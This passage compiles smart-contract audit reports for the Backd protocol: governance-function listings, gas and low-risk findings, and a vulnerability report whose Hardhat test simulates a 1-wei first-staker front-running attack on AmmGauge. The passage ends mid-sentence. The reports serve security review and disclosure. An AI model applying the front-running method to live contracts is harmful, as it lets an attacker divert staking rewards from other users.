prepareKeeperRequiredStakedBKD(uint256 amount) external override onlyGovernance {  89:       function resetKeeperRequiredStakedBKD() external override onlyGovernance { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L33  ```solidity File: protocol/contracts/BkdLocker.sol  53        function initialize( 54            uint256 startBoost, 55            uint256 maxBoost, 56            uint256 increasePeriod, 57            uint256 withdrawDelay 58:       ) external override onlyGovernance {  70:       function migrate(address newRewardToken) external override onlyGovernance { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L53-L58  ```solidity File: protocol/contracts/AddressProvider.sol  63:       function addFeeHandler(address feeHandler) external override onlyGovernance returns (bool) {  70:       function removeFeeHandler(address feeHandler) external override onlyGovernance returns (bool) {  81:       function addAction(address action) external override onlyGovernance returns (bool) {  93        function addPool(address pool) 94            external 95            override 96:           onlyRoles2(Roles.POOL_FACTORY, Roles.GOVERNANCE)  117:      function removePool(address pool) external override onlyRole(Roles.CONTROLLER) returns (bool) {  158       function updateVault(address previousVault, address newVault) 159           external 160           override 161:          onlyRole(Roles.POOL)  212       function initializeAddress( 213           bytes32 key, 214           address initialAddress, 215           bool freezable 216:      ) public override onlyGovernance {  226       function initializeAndFreezeAddress(bytes32 key, address initialAddress) 227           external 228           override 229:          onlyGovernance  239:      function freezeAddress(bytes32 key) external override onlyGovernance {  253       function prepareAddress(bytes32 key, address newAddress) 254           external 255           override 256           onlyGovernance 257:          returns (bool)  278:      function resetAddress(bytes32 key) external override onlyGovernance returns (bool) {  288       function addStakerVault(address stakerVault) 289           external 290           override 291           onlyRole(Roles.CONTROLLER) 292:          returns (bool) ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L63  ```solidity File: protocol/contracts/tokenomics/Minter.sol  99:       function setToken(address _token) external override onlyGovernance {  104:      function startInflation() external override onlyGovernance {  144       function mintNonInflationTokens(address beneficiary, uint256 amount) 145           external 146           override 147           onlyGovernance 148:          returns (bool) ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L99  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol  58:       function setMinter(address _minter) external override onlyGovernance returns (bool) {  70:       function advanceKeeperGaugeEpoch(address pool) external override onlyGovernance returns (bool) {  80:       function mintRewards(address beneficiary, uint256 amount) external override onlyGauge {  89        function deactivateWeightBasedKeeperDistribution() 90            external 91            override 92            onlyGovernance 93:           returns (bool)  133       function prepareKeeperPoolWeight(address pool, uint256 newPoolWeight) 134           external 135           override 136           onlyGovernance 137:          returns (bool)  164       function batchPrepareKeeperPoolWeights(address[] calldata pools, uint256[] calldata weights) 165           external 166           override 167           onlyGovernance 168:          returns (bool)  181:      function whitelistGauge(address gauge) external override onlyRole(Roles.CONTROLLER) {  190       function batchExecuteKeeperPoolWeights(address[] calldata pools) 191           external 192           override 193           onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER) 194:          returns (bool)  205       function removeStakerVaultFromInflation(address stakerVault, address lpToken) 206           external 207           override 208:          onlyRole(Roles.CONTROLLER)  221       function prepareLpPoolWeight(address lpToken, uint256 newPoolWeight) 222           external 223           override 224           onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER) 225:          returns (bool)  258       function batchPrepareLpPoolWeights(address[] calldata lpTokens, uint256[] calldata weights) 259           external 260           override 261           onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER) 262:          returns (bool)  284       function batchExecuteLpPoolWeights(address[] calldata lpTokens) 285           external 286           override 287           onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER) 288:          returns (bool)  309       function prepareAmmTokenWeight(address token, uint256 newTokenWeight) 310           external 311           override 312           onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER) 313:          returns (bool)  339       function addStrategyToDepositStakerVault(address depositStakerVault, address strategyPool) 340           external 341           override 342           onlyGovernance 343:          returns (bool)  357       function batchPrepareAmmTokenWeights(address[] calldata tokens, uint256[] calldata weights) 358           external 359           override 360           onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER) 361:          returns (bool)  380       function batchExecuteAmmTokenWeights(address[] calldata tokens) 381           external 382           override 383           onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER) 384:          returns (bool)  405       function setKeeperGauge(address pool, address _keeperGauge) 406           external 407           override 408           onlyGovernance 409:          returns (bool)  435:      function removeKeeperGauge(address pool) external onlyGovernance returns (bool) {  446       function setAmmGauge(address token, address _ammGauge) 447           external 448           override 449           onlyGovernance 450:          returns (bool)  469:      function removeAmmGauge(address token) external override onlyGovernance returns (bool) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L58  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  57:       function kill() external override onlyInflationManager returns (bool) {  96:       function advanceEpoch() external virtual override onlyInflationManager returns (bool) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L57  ```solidity File: protocol/contracts/access/RoleManager.sol  37:       function grantRole(bytes32 role, address account) external override onlyGovernance {  41:       function addGovernor(address newGovernor) external override onlyGovernance {  45:       function renounceGovernance() external override onlyGovernance {  50:       function addGaugeZap(address zap) external override onlyGovernance {  54:       function removeGaugeZap(address zap) external override onlyGovernance {  111:      function revokeRole(bytes32 role, address account) public onlyGovernance { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L37  
1.  Title: Caching `.length` for loop can save gas  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/access/RoleManager.sol#L82 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/zaps/PoolMigrationZap.sol#L39  Recommended Mitigation Steps: Change to: ```  uint256 Length = roles.length;  for (uint256 i; i < Length; i = i.uncheckedInc()) { ```  ========================================================================  2. Title: Using != is more gas efficient  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L91 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L254  Recommended Mitigation Steps: Change to `!=` ```   require(amount != 0, Error.INVALID_AMOUNT); ```  ========================================================================  3. Title: Using delete statement to empty `curRewardTokenData.userShares` can save gas  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L215 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/utils/Preparable.sol#L87-L88  Recommended Mitigation Steps: ```  delete curRewardTokenData.userShares[msg.sender]; ```  ========================================================================  4. Title: Gas improvement on returning `totalEthRequired` value  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/Controller.sol#L121-L130  Recommended Mitigation Steps: by set `totalEthRequired` in returns and delete L#123 can save gas ``` function getTotalEthRequiredForGas(address payer) external view override returns (uint256 totalEthRequired) { //@audit-info: set here         // solhint-disable-previous-line ordering  //@audit-info: remove this line         address[] memory actions = addressProvider.allActions();         uint256 numActions = actions.length;         for (uint256 i = 0; i < numActions; i++) {             totalEthRequired += IAction(actions[i]).getEthRequiredForGas(payer);         }  return totalEthRequired;     } ```  ========================================================================  5. Title: Using unchecked to calculate  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L124  Recommended Mitigation Steps: `balances[msg.sender]` value was checked that it >= than `amount` so using unchecked can save gas: ``` unchecked{  balances[msg.sender] -= amount; } ```  ========================================================================  6. Title: Unnecessary MSTORE `timeElapsed`  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L144-L149  Recommended Mitigation Steps: By passing `block.timestamp - uint256(ammLastUpdated)` directly to L#148 without storing it to `timeElapsed` can save gas without damaging readability of the code  ```  ammStakedIntegral += (currentRate * (block.timestamp - uint256(ammLastUpdated)).scaledDiv(totalStaked); ```  ========================================================================  7. Title: Unnecessary MSTORE  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L138-L144  Recommended Mitigation Steps: instead of caching `length` to `i`. use it directly can save gas delete L#138 and replace `i` with `length  ========================================================================  8. Title: Use `allowance_` directly to substract  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L387  Recommended Mitigation Steps: ```  _allowances[src][msg.sender] = allowance_ - unstaked; ```  ========================================================================  9. Title: Unnecessary `bool` var set  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L412  Recommended Mitigation Steps: the default value of `bool` is `false`  ========================================================================  10. Title: Using `>` instead `>=` can save gas  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L57 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/utils/Preparable.sol#L110  Recommended Mitigation Steps: 1 second difference can be ignored to validate. using `>` operator can save gas ```  require(starttime_ > block.timestamp, "start must be future"); ```  ========================================================================  11. Title: Use custom errors rather than revert()/require() strings to save deployment gas  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L53-L54  reference: https://blog.soliditylang.org/2021/04/21/custom-errors/  ========================================================================  13. Title: Using `+=` to increase value  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L145  Recommended Mitigation Steps: Change to: ```  totalClaimed[msg.sender] += claimable; ```  ========================================================================  14 Title: Unnecessary MSTORE  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L155-L156  Recommended Mitigation Steps: instead of caching to `elapsed`. calculate directly can save gas delete L#155  ```  return Math.min((locked * (_time - startTime)) / totalTime, locked); ```  ========================================================================
## Don't use deprecated library functions  Information : [L005 - Do not use Deprecated Library Functions](https://github.com/byterocket/c4-common-issues/blob/main/2-Low-Risk.md#l005---do-not-use-deprecated-library-functions) [SafeERC20.sol - safeApprove](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/65b45726b34dafe8fc3ef78c3d4b7b3f404f61ad/contracts/token/ERC20/utils/SafeERC20.sol#L39)  ### Instances include : ``` contracts/RewardHandler.sol:52:        IERC20(targetLpToken).safeApprove(address(bkdLocker), burnedAmount); contracts/RewardHandler.sol:64:        IERC20(token).safeApprove(spender, type(uint256).max); contracts/tokenomics/FeeBurner.sol:118:        IERC20(token_).safeApprove(spender_, type(uint256).max); contracts/zaps/PoolMigrationZap.sol:27:            IERC20(underlying_).safeApprove(address(newPool_), type(uint256).max); ```  ### Recommendation Usage of deprecated library functions, for instance `safeApprove` from OpenZeppelin's `SafeERC20` library is discouraged, it is recommended to use `safeIncreaseAllowance` and `safeDecreaseAllowance` instead.  --- ## Too many digits Information : [Too many digits](https://github.com/crytic/slither/wiki/Detector-Documentation#too-many-digits)   ### Instances include : ``` contracts/utils/CvxMintAmount.sol:10:    uint256 private constant _CLIFF_SIZE = 100000 * 1e18; //new cliff every 100,000 tokens contracts/utils/CvxMintAmount.sol:12:    uint256 private constant _MAX_SUPPLY = 100000000 * 1e18; //100 mil max supply ```  ### Recommendation Use the scientific notation  --- ## Block timestamp Information : [Block timestamp](https://github.com/crytic/slither/wiki/Detector-Documentation#block-timestamp)  ### Instances include : ``` contracts/utils/Preparable.sol:110:        require(block.timestamp >= deadline, Error.DEADLINE_NOT_REACHED); contracts/tokenomics/Minter.sol:190:        if (block.timestamp >= lastInflationDecay + _INFLATION_DECAY_PERIOD) { contracts/BkdLocker.sol:141:            if (stashedWithdraws[i].releaseTime <= block.timestamp) { ``` ### Recommendation Avoid relying on `block.timestamp`.  --- ## Typos  ### Instances include: `invlude`, `successfull` ``` contracts/BkdLocker.sol:     * @dev This does not invlude the gov. tokens queued for withdrawal. contracts/tokenomics/FeeBurner.sol:    event Burned(address targetLpToken, uint256 amountBurned); // Emmited after a successfull burn to target lp token ```
# Gas Optimizations Report  ## For-Loops: Cache array length outside of loops Reading an array length at each iteration of the loop takes 6 gas (3 for `mload` and 3 to place `memory_offset`) in the stack.  Caching the array length in the stack saves around 3 gas per iteration.   For example: ```js for (uint256 i; i < arr.length; ++i) {} ``` can be changed to: ```js uint256 len = arr.length; for (uint256 i; i < len; ++i) {} ```  Consider making the following change to these lines:   ```js protocol/contracts/RewardHandler.sol:   42:        for (uint256 i; i < pools.length; i = i.uncheckedInc()) {  protocol/contracts/StakerVault.sol:  259:        for (uint256 i; i < actions.length; i = i.uncheckedInc()) {  protocol/contracts/tokenomics/VestedEscrow.sol:   94:        for (uint256 i; i < amounts.length; i = i.uncheckedInc()) {  protocol/contracts/tokenomics/InflationManager.sol:  116:        for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) {  protocol/contracts/tokenomics/FeeBurner.sol:   56:        for (uint256 i; i < tokens_.length; i = i.uncheckedInc()) {  protocol/contracts/zaps/PoolMigrationZap.sol:   22:        for (uint256 i; i < newPools_.length; ++i) {   39:        for (uint256 i; i < oldPoolAddresses_.length; ) {  protocol/contracts/access/RoleManager.sol:   82:        for (uint256 i; i < roles.length; i = i.uncheckedInc()) { ```  ## For-Loops: Index increments can be left unchecked From Solidity v0.8 onwards, all arithmetic operations come with implicit overflow and underflow checks.   In for-loops, as it is impossible for the index to overflow, it can be left unchecked to save gas every iteration.   For example, the code below: ```js for (uint256 i; i < numIterations; ++i) {       // ...   }   ``` can be changed to: ```js for (uint256 i; i < numIterations;) {       // ...       unchecked { ++i; }   }   ```  Consider making the following change to these lines:   ```js protocol/contracts/zaps/PoolMigrationZap.sol:   22:        for (uint256 i; i < newPools_.length; ++i) { ```  ## Arithmetics: `++i` costs less gas compared to `i++` or `i += 1` `++i` costs less gas compared to `i++` or `i += 1` for unsigned integers, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  `i++` increments `i` and returns the initial value of `i`. Which means: ```js uint i = 1;   i++; // == 1 but i == 2   ``` But `++i` returns the actual incremented value: ```js uint i = 1;   ++i; // == 2 and i == 2 too, so no need for a temporary variable   ```  In the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`, thus it costs more gas.  The same logic applies for `--i` and `i--`.  Consider using `++i` instead of `i++` or `i += 1` in the following instances:   ```js protocol/contracts/tokenomics/KeeperGauge.sol:   59:        epoch++;   98:        epoch++; ```  ## Arithmetics: Use `!= 0` instead of `> 0` for unsigned integers `uint` will never go below 0. Thus, `> 0` is gas inefficient in comparisons as checking if `!= 0` is sufficient and costs less gas.  Consider changing `> 0` to `!= 0` in these lines:   ```js protocol/contracts/BkdLocker.sol:   91:        require(amount > 0, Error.INVALID_AMOUNT);   92:        require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS);  137:        require(length > 0, "No entries");  139:        while (i > 0) {  254:        if (userBalance > 0) {  301:        if (userBalance > 0) {  protocol/contracts/RewardHandler.sol:   63:        if (IERC20(token).allowance(address(this), spender) > 0) return;  protocol/contracts/tokenomics/AmmGauge.sol:   88:        if (!killed && totalStaked > 0) {  104:        require(amount > 0, Error.INVALID_AMOUNT);  125:        require(amount > 0, Error.INVALID_AMOUNT);  147:        if (totalStaked > 0) {  protocol/contracts/tokenomics/AmmConvexGauge.sol:  107:        if (!killed && totalStaked > 0) {  129:        if (!killed && totalStaked > 0) {  158:        require(amount > 0, Error.INVALID_AMOUNT);  171:        require(amount > 0, Error.INVALID_AMOUNT);  197:        if (totalStaked > 0) {  protocol/contracts/tokenomics/VestedEscrow.sol:   84:        require(unallocatedSupply > 0, "No reward tokens in contract");  protocol/contracts/tokenomics/InflationManager.sol:  575:        totalKeeperPoolWeight = totalKeeperPoolWeight > 0 ? totalKeeperPoolWeight : 0;  589:        totalLpPoolWeight = totalLpPoolWeight > 0 ? totalLpPoolWeight : 0;  602:        totalAmmTokenWeight = totalAmmTokenWeight > 0 ? totalAmmTokenWeight : 0;  protocol/contracts/tokenomics/LpGauge.sol:   68:        if (poolTotalStaked > 0) {  114:        if (poolTotalStaked > 0) {  protocol/contracts/tokenomics/FeeBurner.sol:  117:        if (IERC20(token_).allowance(address(this), spender_) > 0) return;  protocol/contracts/tokenomics/KeeperGauge.sol:  140:        require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); ```  ## Errors: Use custom errors instead of revert strings Since Solidity v0.8.4, custom errors should be used instead of revert strings due to: * Cheaper deployment cost * Lower runtime cost upon revert  Taken from [Custom Errors in Solidity](https://blog.soliditylang.org/2021/04/21/custom-errors/): > Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert("Insufficient funds.");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.  Custom errors can be defined using of the `error` statement, both inside or outside of contracts.  Instances where custom errors can be used instead:   ```js protocol/contracts/BkdLocker.sol:  137:        require(length > 0, "No entries");  protocol/contracts/tokenomics/Minter.sol:  100:        require(address(token) == address(0), "Token already set!");  105:        require(lastEvent == 0, "Inflation has already started.");  220:        require(newTotalMintedToNow <= totalAvailableToNow, "Mintable amount exceeded");  protocol/contracts/tokenomics/VestedEscrow.sol:   57:        require(starttime_ >= block.timestamp, "start must be future");   58:        require(endtime_ > starttime_, "end must be greater");   82:        require(!initializedSupply, "Supply already initialized once");   84:        require(unallocatedSupply > 0, "No reward tokens in contract");   91:        require(initializedSupply, "Supply must be initialized");  protocol/contracts/tokenomics/InflationManager.sol:   95:        require(!weightBasedKeeperDistributionDeactivated, "Weight-based dist. deactivated.");  265:        require(length == weights.length, "Invalid length of arguments");  315:        require(_ammGauges.contains(token), "amm gauge not found");  365:        require(length == weights.length, "Invalid length of arguments");  367:        require(_ammGauges.contains(tokens[i]), "amm gauge not found");  protocol/contracts/tokenomics/VestedEscrowRevocable.sol:   53:        require(revokedTime[_recipient] == 0, "Recipient already revoked");   54:        require(_recipient != treasury, "Treasury cannot be revoked!");  protocol/contracts/tokenomics/FeeBurner.sol:   49:        require(tokens_.length != 0, "No tokens to burn");  protocol/contracts/zaps/PoolMigrationZap.sol:   56:        require(lpTokenAmount_ != 0, "No LP Tokens");   57:        require(oldPool_.getWithdrawalFee(msg.sender, lpTokenAmount_) == 0, "withdrawal fee not 0"); ```  ## Unnecessary initialization of variables with default values Uninitialized variables are assigned with a default value depending on its type: * `uint`: `0` * `bool`: `false` * `address`: `address(0)`  Thus, explicitly initializing a variable with its default value costs unnecesary gas. For example, the following code: ```js bool b = false; address c = address(0); uint256 a = 0; ``` can be changed to: ```js uint256 a; bool b; address c; ```  Consider declaring the following lines without explicitly setting a value:   ```js protocol/contracts/tokenomics/InflationManager.sol:  412:        bool keeperGaugeExists = false; ```  ## Unnecessary definition of variables Some variables are defined even though they are only used once in their respective functions. Not defining these variables can help to reduce gas cost and contract size.  Instances include:   ```js protocol/contracts/BkdLocker.sol:  150:        uint256 newTotal = balances[msg.sender] - totalAvailableToWithdraw;  protocol/contracts/RewardHandler.sol:   40:        uint256 ethBalance = address(this).balance;  protocol/contracts/tokenomics/AmmConvexGauge.sol:  153:        uint256[3] memory allRewards = [bkdRewards, crvRewards, cvxRewards];  protocol/contracts/tokenomics/VestedEscrow.sol:  155:        uint256 elapsed = _time - startTime;  protocol/contracts/tokenomics/KeeperGauge.sol:  112:        uint256 timeElapsed = block.timestamp - uint256(lastUpdated); ```   ## Storage variables should be declared `immutable` when possible If a storage variable is assigned only in the constructor, it should be declared as `immutable`. This would help to reduce gas costs as calls to `immutable` variables are much cheaper than regular state variables, as seen from the [Solidity Docs](https://docs.soliditylang.org/en/v0.8.13/contracts.html#constant-and-immutable-state-variables): > Compared to regular state variables, the gas costs of constant and immutable variables are much lower. Immutable variables are evaluated once at construction time and their value is copied to all the places in the code where they are accessed.  Consider declaring these variables as `immutable`:   ```js protocol/contracts/StakerVault.sol:   48:        address public token;  protocol/contracts/tokenomics/VestedEscrow.sol:   39:        uint256 public totalTime; ```  ## Variables declared as `constant` are expressions, not constants Due to how `constant` variables are implemented (replacements at compile-time), an expression assigned to a `constant` variable is recomputed each time that the variable is used, which wastes some gas.  If the variable was `immutable` instead: the calculation would only be done once at deploy time (in the constructor), and then the result would be saved and read directly at runtime rather than being recalculated.  See: [ethereum/solidity#9232](https://github.com/ethereum/solidity/issues/9232): > Consequences: each usage of a “constant” costs ~100 gas more on each access (it is still a little better than storing the result in storage, but not much). since these are not real constants, they can’t be referenced from a real constant environment (e.g. from assembly, or from another library)  ```js protocol/contracts/tokenomics/FeeBurner.sol:   25:        address private constant _WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);  protocol/contracts/utils/CvxMintAmount.sol:   10:        uint256 private constant _CLIFF_SIZE = 100000 * 1e18;   12:        uint256 private constant _MAX_SUPPLY = 100000000 * 1e18;    13:        IERC20 private constant _CVX_TOKEN =   14:                IERC20(address(0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B)); ```  Change these expressions from `constant` to `immutable` and implement the calculation in the constructor. Alternatively, hardcode these values in the constants and add a comment to say how the value was calculated. 
## Don't explicitly initialize variables with the default value  Uninitialized variables are assigned with the default value of their type, initializing a variable with its default value costs unnecessary gas.  ### Instances include : ``` contracts/tokenomics/InflationManager.sol:412:        bool keeperGaugeExists = false; ```  ### Recommendation It is recommended to initialize variables without assigning them the default value, for example : ``` contracts/tokenomics/InflationManager.sol:412:        bool keeperGaugeExists; ``` ---  ## Cache array length outside of for loop  Caching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop.  ### Instances include : ``` contracts/RewardHandler.sol:42:        for (uint256 i; i < pools.length; i = i.uncheckedInc()) { contracts/access/RoleManager.sol:82:        for (uint256 i; i < roles.length; i = i.uncheckedInc()) { contracts/StakerVault.sol:259:        for (uint256 i; i < actions.length; i = i.uncheckedInc()) { contracts/tokenomics/VestedEscrow.sol:94:        for (uint256 i; i < amounts.length; i = i.uncheckedInc()) { contracts/tokenomics/InflationManager.sol:116:        for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) { contracts/tokenomics/FeeBurner.sol:56:        for (uint256 i; i < tokens_.length; i = i.uncheckedInc()) { contracts/zaps/PoolMigrationZap.sol:22:        for (uint256 i; i < newPools_.length; ++i) { contracts/zaps/PoolMigrationZap.sol:39:        for (uint256 i; i < oldPoolAddresses_.length; ) { ```  ### Recommendation It is recommended to cache the array length on a variable before running the loop, then it doesn't need to read the length on every iteration, which cost gas, for example : ``` uint256 len = pools.length; contracts/RewardHandler.sol:42:        for (uint256 i; i < len; i = i.uncheckedInc()) { ``` ---  ## Use != 0 instead of > 0 when comparing unsigned integers  != 0 will do the same as > 0 for unsigned integers, but != 0 costs less gas compared to > 0 for unsigned integers in require statements with the optimizer enabled.  ### Instances include : ``` contracts/BkdLocker.sol:91:        require(amount > 0, Error.INVALID_AMOUNT); contracts/BkdLocker.sol:92:        require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS); contracts/BkdLocker.sol:137:        require(length > 0, "No entries"); contracts/tokenomics/KeeperGauge.sol:140:        require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); contracts/tokenomics/VestedEscrow.sol:84:        require(unallocatedSupply > 0, "No reward tokens in contract"); contracts/tokenomics/AmmGauge.sol:104:        require(amount > 0, Error.INVALID_AMOUNT); contracts/tokenomics/AmmGauge.sol:125:        require(amount > 0, Error.INVALID_AMOUNT); ```  ### Recommendation It is recommended to replace `> 0` with `!= 0`, as they do the same thing for unsigned integers, and '!= 0' costs less gas compared to `> 0` in require statements with the optimizer enabled, also enable the optimizer.   For example : ``` contracts/BkdLocker.sol:91:        require(amount != 0, Error.INVALID_AMOUNT); ``` ---  ## If possible, use prefix increment instead of postfix increment  Prefix increment `++i` returns the updated value after it's incremented and postfix increment `i++` returns the original value then increments it. Prefix increment costs less gas compared to postfix increment.  ### Instances includes : ``` contracts/tokenomics/KeeperGauge.sol:59:        epoch++; contracts/tokenomics/KeeperGauge.sol:98:        epoch++; ```  ### Recommendation It is recommended to use prefix increment instead of postfix one when the return value is not needed, as both of them will give the same result and prefix increment costs less gas.   For example : ``` contracts/tokenomics/KeeperGauge.sol:59:        ++epoch; ``` ---
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L147 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L154   # Vulnerability details  ## Impact The first staker can take control of how the subsequent shares are going to be distributed by simply staking 1wei amount of the token and frontrunning future stakers. The reasons of this are related on how the variables are updated and with the amounts that the Gauge allows users to stake (anything but zero). The origin of this vulnerability relies on the evaluation of the `totalStaked` variable on its inception.  ## Proof of Concept To illustrate this attack an environment of testing was made in order to track the token flows and how the variables are being updated and read.  The initial or border conditions taken into account are the same as the used by the team to perform the tests and just a few assumptions and simplifications were taken.  1) The inflation rate is fixed for simplicity (`0.001`). This is valid within a short period of time because it is not a function of how the tokens are distributed or their flows. By tracking how the inflation rate is calculated an updated, we see that it is managed by the `currentInflationAmountAmm` within the [`Minter.sol` contract](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L184), which value is modified by `_executeInflationRateUpdate()` three lines below the last code permalink. Its value depends on non-token balance related parameters (such as inflation decays and annual rates). 2) For the testing environment performed by the team, a DummyERC20 was used as testing token. The same is done on the exploit environment. 3) The controller is not used because it is used to retrieve the inflation rate and it is now fixed because of 1).  Each user state is updated whenever he calls either `stake`, `unstake` or `claimRewards`.  Steps: - Alice is the first staker and deposits 1wei worth of DummyERC20. - Bob takes one day to find out this new protocol and decides to stake 10 ETH amount of tokens (`10 * 10**decimals()`). - Alice, who was scanning the mempool, frontruns Bob with the same amount he was willing to stake. Her txn is mined first. - Then Bobs' transaction is mined for the 10 ETH worth. - Sometime after this, the pool is checkpointed. - A few days pass, and Bob wants to stake even more tokens. The same amount as before. - Alice frontruns him again updating her shares. - Bobs' transaction is mined and his shares are also updated. - The pool is checkpointed again. And Alice managed to increase considerably her amount of shares.  Both cases were evaluated (with and without staking 1 wei first). The attack scenario outputs a 100% more shares to Alice than Bob in comparison with the ethical/non-attack situation.  The code used to perform this test is the following:      it("First Depositer Exploit", async function () {             let userShares = []             let userIntegral = []             let userBalance = []              let globalIntegral, totalStaked;             let aliceBob = [alice, bob];              // Starting Checkpoint             await this.ammgauge.poolCheckpoint();             await ethers.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]); // 10 days                          const updateStates = async () => {                  userShares = []                 userIntegral = []                 userBalance = []                 for (const user of aliceBob) {                     let balances = ethers.utils.formatEther(await this.ammgauge.balances(user.address));                     let currentShare = ethers.utils.formatEther(await this.ammgauge.perUserShare(user.address));                     let currentStakedIntegral = ethers.utils.formatEther(await this.ammgauge.perUserStakedIntegral(user.address));                     userShares.push(currentShare);                     userIntegral.push(currentStakedIntegral);                     userBalance.push(balances);                 }                 globalIntegral = await this.ammgauge.ammStakedIntegral()                 totalStaked = await this.ammgauge.totalStaked()                 console.log("  ")                 console.log("         ALICE / BOB");                 console.log(`Shares: ${userShares}`);                 console.log(`Integr: ${userIntegral}`);                 console.log(`Balanc: ${userBalance}`);                 console.log("  ")                 console.log("Global")                 console.log(`Integral: ${ethers.utils.formatEther(globalIntegral)}, TotalStaked: ${ethers.utils.formatEther(totalStaked)}`)             }              const stake = async (to, amount) => {                 await updateStates()                 console.log(" ")                 // Balance before                 let balanceBefore = await this.ammgauge.balances(to.address);                 // Stake                 await this.ammgauge.connect(to).stake(amount);                 expect(await this.ammgauge.balances(to.address)).to.be.eq(balanceBefore.add(amount));                 // await updateStates();                 console.log(" ")             }              const unstake = async (to, amount) => {                 await updateStates()                 console.log(" ")                 // Balance before                 let balanceBefore = await this.ammgauge.balances(to.address);                 // Stake                 await this.ammgauge.connect(to).unstake(amount);                 expect(await this.ammgauge.balances(to.address)).to.be.eq(balanceBefore.sub(amount));                 await updateStates();                 console.log(" ")             }              // HERE IS WHERE THE SIMULATION IS PERFORMED             let simulationTimes = 2;             let withOneWeiDeposit = true;              if (withOneWeiDeposit) {                 // Alice deposits first                 console.log("Alice Deposits 1wei")                 let firstUserDeposit = ethers.utils.parseEther("1");                 await stake(alice, 1);             }              for (let index = 1; index <= simulationTimes; index++) {                 console.log(" ")                 console.log(`Loop number ${index}`);                 console.log(" ")                  console.log("A day passes until Bob decides to deposit")                 await ethers.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]); // 1 days                  console.log(" ")                 console.log("She scans that Bob is about to stake 10. So decides to frontrun him.")                 console.log("Alice Frontruns")                 let frontrunAmount = ethers.utils.parseEther("10");                 await stake(alice, frontrunAmount);                  console.log(" ")                 console.log("Bob stakes 10 tokens")                 await stake(bob, frontrunAmount)                  // A few days pass                 await ethers.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]); // 2 days                 // The pool is checkpointed                 await this.ammgauge.poolCheckpoint();                 console.log("After 1 day the pool is checkpointed")                 await updateStates()              }         })  The simulation was both made for the attacked and non attacked situations. The values that are shown represent how the contract updates them (the 